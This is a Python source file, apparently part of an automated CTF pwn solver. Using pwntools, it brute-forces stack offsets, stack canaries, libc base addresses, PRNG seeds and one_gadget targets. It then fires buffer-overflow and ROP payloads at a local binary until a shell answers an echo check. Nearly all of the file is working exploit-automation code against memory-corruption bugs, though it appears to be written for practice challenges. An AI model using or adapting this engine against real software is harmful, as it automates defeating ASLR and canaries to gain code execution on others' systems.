#!/usr/bin/env python3
"""
爆破引擎 - 当精确工具无法确定参数时，进行智能爆破
策略: 工具→爆破→放弃
"""
import time
from pwn import process, remote, context, log, p64, u64, ELF

class BruteForcer:
    """智能爆破器 — 对不确定参数进行分层爆破"""
    
    def __init__(self, binary_path, verbose=True):
        self.binary_path = binary_path
        self.verbose = verbose
        self.elf = ELF(binary_path, checksec=False) if binary_path else None
        
    def log(self, msg, level='info'):
        if self.verbose:
            getattr(log, level)(f"  [brute] {msg}")
    
    def brute_offset(self, min_off=0x20, max_off=0x200, step=8, 
                     payload_func=None, success_check=None, timeout=3):
        """
        爆破栈偏移量
        """
        self.log(f"爆破偏移: {hex(min_off)} ~ {hex(max_off)}, step={step}")
        
        for offset in range(min_off, max_off + 1, step):
            p = None
            try:
                p = process(self.binary_path)
                payload = payload_func(offset)
                p.send(payload)
                time.sleep(0.3)
                
                if success_check(p):
                    self.log(f"✓ 偏移找到: {offset} ({hex(offset)})")
                    return offset
            except Exception:
                pass
            finally:
                if p:
                    try: p.close()
                    except: pass
            
            if offset % 0x40 == 0:
                self.log(f"  尝试中... {hex(offset)}")
        
        self.log("✗ 偏移爆破失败")
        return None
    
    def brute_canary(self, leak_func=None, max_bytes=8, timeout=5):
        """
        爆破canary (逐字节，适用于fork-server)
        leak_func(idx, guess) -> bool  # 第idx字节猜测guess是否正确
        返回完整的canary值
        """
        self.log(f"爆破canary ({max_bytes} bytes)...")
        canary = b''
        
        for byte_idx in range(max_bytes):
            found = False
            for guess in range(256):
                if leak_func(byte_idx, guess, canary):
                    canary += bytes([guess])
                    self.log(f"  canary[{byte_idx}] = {hex(guess)}", 'success')
                    found = True
                    break
            if not found:
                self.log(f"✗ canary爆破失败(byte {byte_idx})", 'warning')
                return None
        
        canary_val = u64(canary.ljust(8, b'\x00'))
        self.log(f"✓ canary = {hex(canary_val)}", 'success')
        return canary_val
    
    def brute_libc_base(self, known_offset, target_func='system',
                        payload_func=None, success_check=None,
                        max_shift=0x200000, step=0x1000, timeout=5):
        """
        爆破libc基址 (当ASLR只有12位随机时)
        known_offset: one_gadget偏移
        """
        self.log(f"爆破libc基址: og_offset={hex(known_offset)}, range={hex(max_shift)}")
        # 典型libc基址: 0x7f????000000, 尝试不同page
        base_samples = [0x7f0000000000, 0x7f8000000000, 0x7ff000000000]
        
        for base_guess in base_samples:
            for shift in range(0, max_shift, step):
                for attempt in range(2):
                    p = None
                    try:
                        guess = base_guess + shift
                        payload = payload_func(guess + known_offset)
                        p = process(self.binary_path)
                        p.send(payload)
                        time.sleep(0.3)
                        
                        if success_check(p):
                            self.log(f"✓ libc base = {hex(guess)}")
                            return guess
                    except Exception:
                        pass
                    finally:
                        if p:
                            try: p.close()
                            except: pass
        
        self.log("✗ libc爆破失败")
        return None
    
    def brute_prng_seed(self, target_func=None, success_check=None,
                        seed_range=None, max_seed=1000000, timeout=3):
        """爆破PRNG种子 (s.s.a.l风格)
        
        当程序使用srand固定种子或time(0)作为种子时，
        爆破可能的种子值来复现随机序列
        
        Args:
            target_func(seed) -> payload: 给定种子，生成payload
            success_check(p) -> bool: 检查是否成功
            seed_range: (min, max) 或 None(自动)
        """
        if seed_range:
            min_seed, max_seed = seed_range
        else:
            min_seed, max_seed = 0, max_seed
        
        self.log(f"爆破PRNG种子: {min_seed} ~ {max_seed}")
        
        for seed in range(min_seed, max_seed + 1):
            p = None
            try:
                payload = target_func(seed) if target_func else None
                p = process(self.binary_path)
                
                # 发送种子
                p.sendline(str(seed).encode())
                if payload:
                    p.send(payload)
                
                time.sleep(0.3)
                
                if success_check(p):
                    self.log(f"✓ PRNG种子找到: {seed}", 'success')
                    return seed
            except Exception:
                pass
            finally:
                if p:
                    try: p.close()
                    except: pass
            
            if seed % 50000 == 0 and seed > 0:
                self.log(f"  尝试中... {seed}/{max_seed}")
        
        self.log("✗ PRNG种子爆破失败")
        return None
    
    def brute_one_gadget_with_constraints(self, one_gadgets, base_leak=None,
                                          clearing_gadgets=None, success_check=None,
                                          max_attempts=256, timeout=5):
        """爆破one_gadget + 清除约束 (yes_or_no风格)
        
        Args:
            one_gadgets: [{'offset': hex, 'constraints': str}]
            base_leak: libc基址泄露函数 -> int
            clearing_gadgets: {'pop_r12': addr, 'pop_r15': addr}
            success_check(io) -> bool
        """
        self.log(f"爆破one_gadget (最多{max_attempts}次)...")
        
        if not one_gadgets:
            self.log("没有可用的one_gadget")
            return None
        
        pop_r12 = clearing_gadgets.get('pop_r12') if clearing_gadgets else None
        pop_r15 = clearing_gadgets.get('pop_r15') if clearing_gadgets else None
        
        for og in one_gadgets:
            offset = int(og['offset'], 16)
            constraints = og.get('constraints', '')
            self.log(f"尝试 OG@{hex(offset)}: {constraints}")
            
            for attempt in range(max_attempts):
                p = None
                try:
                    if base_leak:
                        libc_base = base_leak()
                    else:
                        libc_base = 0x7f0000000000 + attempt * 0x2000
                    
                    target = libc_base + offset
                    
                    # 构造payload: 清除约束寄存器 + OG地址
                    payload = b'A' * 0x28  # 偏移(框架会覆盖)
                    
                    # 添加寄存器清除gadgets (yes_or_no技巧)
                    if pop_r12:
                        payload += p64(pop_r12) + p64(0)
                    if pop_r15:
                        payload += p64(pop_r15) + p64(0)
                    
                    payload += p64(target)
                    
                    p = process(self.binary_path)
                    p.send(payload)
                    time.sleep(0.3)
                    
                    if success_check(p):
                        self.log(f"✓ OG爆破成功: {hex(libc_base)} + {hex(offset)}", 'success')
                        return {'base': libc_base, 'og': offset, 'target': target}
                except Exception:
                    pass
                finally:
                    if p:
                        try: p.close()
                        except: pass
                
                if attempt % 32 == 0 and attempt > 0:
                    self.log(f"  尝试中... {attempt}/{max_attempts}")
        
        self.log("✗ OG爆破失败")
        return None
    
    def brute_ret2win_offset(self, win_addr, min_off=0x20, max_off=0x100, timeout=3):
        """爆破ret2win的偏移量（最简单场景）"""
        def make_payload(offset):
            return b'A' * offset + p64(win_addr)
        
        def check_success(p):
            try:
                # 检查是否有flag输出或shell
                p.sendline(b'echo PWNED_OK')
                time.sleep(0.3)
                resp = p.recv(timeout=2)
                return b'PWNED_OK' in resp or b'flag' in resp.lower()
            except Exception:
                return False
        
        return self.brute_offset(
            min_off, max_off, 8, make_payload, check_success, timeout
        )


class StrategyEngine:
    """分层策略引擎：工具→GDB调试→爆破→放弃"""
    
    TIER_TOOLS = 1    # 精确工具
    TIER_GDB   = 2    # GDB动态调试
    TIER_BRUTE = 3    # 爆破
    TIER_GIVEUP = 4   # 放弃
    
    def __init__(self, solver):
        self.solver = solver
        self.verbose = solver.verbose
        self.bruteforcer = BruteForcer(solver.binary_path, verbose=solver.verbose)
        self.current_tier = self.TIER_TOOLS
        self.attempts = []
        
    def log(self, msg, level='info'):
        if self.verbose:
            getattr(log, level)(f"  [strategy] {msg}")
    
    def execute(self):
        """执行分层策略"""
        self.log("=" * 40)
        self.log("分层策略引擎启动")
        self.log(f"  Tier 1: 精确工具 (ROPgadget/one_gadget/LibcSearcher)")
        self.log(f"  Tier 2: GDB动态调试 (pattern偏移/canary/寄存器泄露)")
        self.log(f"  Tier 3: 智能爆破 (偏移/canary/libc基址)")
        self.log(f"  Tier 4: 放弃 (报告失败原因)")
        self.log("=" * 40)
        
        # === Tier 1: 精确工具 ===
        self.current_tier = self.TIER_TOOLS
        result = self._try_tools()
        if result:
            return result
        
        # === Tier 2: GDB动态调试 ===
        self.current_tier = self.TIER_GDB
        self.log("\n[*] Tier 1失败，进入Tier 2: GDB动态调试")
        result = self._try_gdb_debug()
        if result:
            return result
        
        # === Tier 3: 爆破 ===
        self.current_tier = self.TIER_BRUTE
        self.log("\n[*] Tier 2失败，进入Tier 3: 爆破模式")
        result = self._try_bruteforce()
        if result:
            return result
        
        # === Tier 4: 放弃 ===
        self.current_tier = self.TIER_GIVEUP
        self._report_failure()
        return None
    
    def _try_tools(self):
        """Tier 1: 使用精确工具"""
        analysis = self.solver.analyze()
        gadgets = self.solver.find_gadgets()
        vuln_type = self.solver.determine_vuln_type(analysis, gadgets)
        
        self.log(f"工具检测结果: {vuln_type[0]} (置信度: {vuln_type[1]})")
        
        # 检查是否有足够的精确信息
        specific = gadgets.get('specific', {})
        has_pop_rdi = gadgets.get('pop_rdi_in_binary', False)
        has_one_gadget = bool(gadgets.get('one_gadgets'))
        
        # 精确信息充分 → 直接生成exploit
        if vuln_type[1] >= 80:
            self.log("精确信息充分，生成exploit...")
            code = self.solver.generate_exploit(analysis, gadgets)
            if code:
                success = self.solver.test_exploit()
                if success:
                    self.log("✓ Tier 1 成功!", 'success')
                    return True
        
        # 精确信息不足 → 记录缺失项
        missing = []
        if not has_pop_rdi and vuln_type[0] in ('ret2libc', 'rop'):
            missing.append("binary无pop_rdi gadget (GCC15?)")
        if not has_one_gadget and vuln_type[0] == 'one_gadget':
            missing.append("无one_gadget (需要libc文件)")
        
        if missing:
            for m in missing:
                self.log(f"  ⚠ 缺失: {m}", 'warning')
        
        self.attempts.append(('tools', vuln_type, missing))
        return None
    
    def _try_gdb_debug(self):
        """Tier 2: GDB/Pwndbg动态调试自动发现参数"""
        self.log("启动GDB动态调试...")
        
        try:
            from gdb_debugger import GdbDebugger
            gdb = GdbDebugger(self.solver.binary_path, verbose=self.verbose)
            
            # v2没有_gdb_available属性，直接尝试
            self.log("启动dmesg偏移检测...")
            
            # 运行自动调试工作流
            info = gdb.auto_debug_workflow()
            
            if info.get('offset'):
                # 找到了偏移量！更新analysis并重新生成exploit
                offset = info['offset']
                self.log(f"GDB发现偏移: {offset}", 'success')
                
                # 更新solver的analysis数据
                if hasattr(self.solver, 'analysis') and self.solver.analysis:
                    self.solver.analysis['buffers'] = [
                        {'type': 'stack_frame', 'size': offset - 8}
                    ]
                
                # 检查是否有canary
                if info.get('canary'):
                    self.log(f"GDB发现canary: {hex(info['canary'])}", 'success')
                
                # 检查libc泄露
                if info.get('libc_leaks'):
                    self.log(f"GDB发现寄存器泄露: {list(info['libc_leaks'].keys())}", 'success')
                
                # 重新生成exploit
                analysis = getattr(self.solver, 'analysis', {})
                gadgets = getattr(self.solver, 'gadgets', {})
                if analysis and gadgets:
                    code = self.solver.generate_exploit(analysis, gadgets)
                    if code:
                        success = self.solver.test_exploit()
                        if success:
                            self.log("✓ Tier 2 (GDB) 成功!", 'success')
                            return True
            
            self.log("GDB调试未解决，继续下一层")
            
        except ImportError:
            self.log("gdb_debugger模块不可用")
        except Exception as e:
            self.log(f"GDB调试异常: {e}")
        
        return None
    
    def _try_bruteforce(self):
        """Tier 2: 智能爆破"""
        self.log("开始爆破...")
        
        analysis = self.solver.analysis if hasattr(self.solver, 'analysis') else {}
        gadgets = self.solver.gadgets if hasattr(self.solver, 'gadgets') else {}
        funcs = analysis.get('functions', {}) if analysis else {}
        vuln_type = getattr(self.solver, 'vuln_type', None)
        
        # 策略2a: 爆破偏移量 (ret2win)
        if vuln_type and vuln_type[0] == 'ret2win':
            win_funcs = funcs.get('win', [])
            if win_funcs:
                win_addr = int(win_funcs[0][1], 16)
                self.log(f"爆破ret2win偏移 (win@{hex(win_addr)})...")
                offset = self.bruteforcer.brute_ret2win_offset(win_addr)
                if offset:
                    self.log(f"✓ 偏移爆破成功: {offset}", 'success')
                    # 用找到的偏移重新生成exploit
                    if analysis:
                        analysis['buffers'] = [{'type': 'stack_frame', 'size': offset - 8}]
                    code = self.solver.generate_exploit(analysis, gadgets)
                    if code and self.solver.test_exploit():
                        self.log("✓ Tier 2 成功!", 'success')
                        return True
        
        # 策略2b: 爆破libc基址 (one_gadget)
        if vuln_type and vuln_type[0] == 'one_gadget':
            has_canary = analysis.get('protections', {}).get('canary', False)
            if has_canary:
                self.log("✗ canary保护 — 跳过libc爆破(需先leak canary)")
            else:
                one_gadgets = gadgets.get('one_gadgets', []) if gadgets else []
                if one_gadgets:
                    og_off = int(one_gadgets[0]['offset'], 16)
                    self.log(f"爆破libc基址 (max 50次)...")
                    
                    for i in range(50):
                        base = 0x7f0000000000 + i * 0x2000
                        target = base + og_off
                        try:
                            p = process(self.binary_path)
                            p.sendline(b'A' * 0x28 + p64(target))
                            time.sleep(0.2)
                            try:
                                p.sendline(b'echo PWNED_OK')
                                if b'PWNED_OK' in p.recv(timeout=1):
                                    self.log(f"✓ libc爆破成功: {hex(base)}", 'success')
                                    p.close()
                                    return True
                            except: pass
                            p.close()
                        except: pass
                    self.log("✗ libc爆破失败")
        
        self.attempts.append(('bruteforce', 'failed', []))
        return None
    
    def _report_failure(self):
        """Tier 3: 报告失败"""
        self.log("\n" + "=" * 40)
        self.log("Tier 3: 自动解题失败 — 诊断报告")
        self.log("=" * 40)
        
        analysis = self.solver.analysis if hasattr(self.solver, 'analysis') else {}
        gadgets = self.solver.gadgets if hasattr(self.solver, 'gadgets') else {}
        
        if analysis:
            prot = analysis.get('protections', {})
            funcs = analysis.get('functions', {})
            self.log(f"  架构: {analysis.get('info', {}).get('arch', '?')}")
            self.log(f"  NX: {prot.get('nx')}, PIE: {prot.get('pie')}, Canary: {prot.get('canary')}")
            self.log(f"  危险函数: {len(funcs.get('dangerous', []))}")
            self.log(f"  Win函数: {len(funcs.get('win', []))}")
        
        specific = gadgets.get('specific', {})
        self.log(f"  pop_rdi(in binary): {gadgets.get('pop_rdi_in_binary', False)}")
        self.log(f"  one_gadgets: {len(gadgets.get('one_gadgets', []))}")
        self.log(f"  ROP gadgets: {len(gadgets.get('rop_gadgets', []))}")
        
        self.log("\n  可能原因:")
        if not gadgets.get('pop_rdi_in_binary', False):
            self.log("  → binary无pop rdi gadget (GCC15? 尝试-static编译)")
        if not gadgets.get('one_gadgets'):
            self.log("  → 无one_gadget (提供libc: solver.py -l libc.so.6)")
        if analysis.get('protections', {}).get('canary'):
            self.log("  → canary保护 (需要信息泄露)")
        if analysis.get('protections', {}).get('pie'):
            self.log("  → PIE启用 (需要基址泄露)")
        
        self.log("\n  建议:")
        self.log("  1. gcc -static → 确保binary有完整gadgets")
        self.log("  2. solver.py binary -l libc.so.6 → 指定libc启用one_gadget")
        self.log("  3. 手动分析后补充偏移量信息")
